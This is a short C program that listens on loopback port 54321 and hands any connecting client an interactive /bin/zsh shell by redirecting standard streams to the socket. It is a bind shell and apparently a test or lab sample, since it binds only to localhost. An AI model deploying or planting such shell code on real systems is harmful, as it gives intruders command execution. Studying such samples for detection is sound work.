#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
  struct sockaddr_in sa;
  sa.sin_family = AF_INET;
  sa.sin_port = htons(54321);
  sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

  int sock = socket(AF_INET, SOCK_STREAM, 0);

  bind(sock, (struct sockaddr*)&sa, sizeof(struct sockaddr_in));
  listen(sock, 0);
  struct sockaddr_in connected_addr;
  int connected_addr_size;
  int conn = accept(sock, &connected_addr, &connected_addr_size);
  close(sock);

  dup2(conn, 0);
  dup2(conn, 1);
  dup2(conn, 2);

  char* bin_sh = "/bin/zsh";
  char* argv[] = {bin_sh, NULL};
  char* envp[] = {NULL};
  execve(bin_sh, argv, envp);

  close(conn);
}

